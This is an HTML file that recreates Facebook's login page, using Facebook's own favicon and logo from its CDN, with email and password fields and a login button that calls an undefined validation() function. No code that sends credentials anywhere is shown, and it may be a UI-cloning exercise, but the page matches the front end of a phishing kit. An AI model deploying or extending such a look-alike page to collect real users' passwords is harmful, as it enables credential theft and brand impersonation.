<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="main">
        <div>
            <img style="height: 84px; width: 240px;" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook logo">
        </div>
        <div class="container">
            <span class="login">Log in to Facebook</span>
            <input type="text" name="email" id="email" placeholder="Email address or Phone number" required>
            <input type="password" name="pass" id="pass" placeholder="Password" required>
            <button class="login-btn" onclick="validation()">Log in</button>
            <a href="#">Forget Password</a>
            <div class="sytle">or</div>
            <button class="new-account">Create New Account</button>
        </div>
    </div>
</body>
</html>
